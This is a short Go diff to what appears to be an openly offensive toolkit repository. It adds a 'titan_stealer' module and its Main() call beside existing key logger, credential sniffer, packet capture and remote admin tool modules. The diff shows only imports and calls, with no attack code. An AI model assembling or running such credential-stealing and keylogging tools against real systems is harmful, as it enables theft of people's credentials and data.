@@ -9,6 +9,7 @@ import (
 	sniff_n_capture "github.com/brk-a/offensive_go/sniff_and_capture"
 	sub_domain_finder "github.com/brk-a/offensive_go/sub_domain_finder"
 	key_logger "github.com/brk-a/offensive_go/web_key_logger"
+	titan_stealer "github.com/brk-a/offensive_go/titan_stealer"
 )
 
 func main() {
@@ -20,4 +21,5 @@ func main() {
 	sub_domain_finder.Main()
 	net_cred_sniffer.Main()
 	remote_admin_tool.Main()
+	titan_stealer.Main()
 }
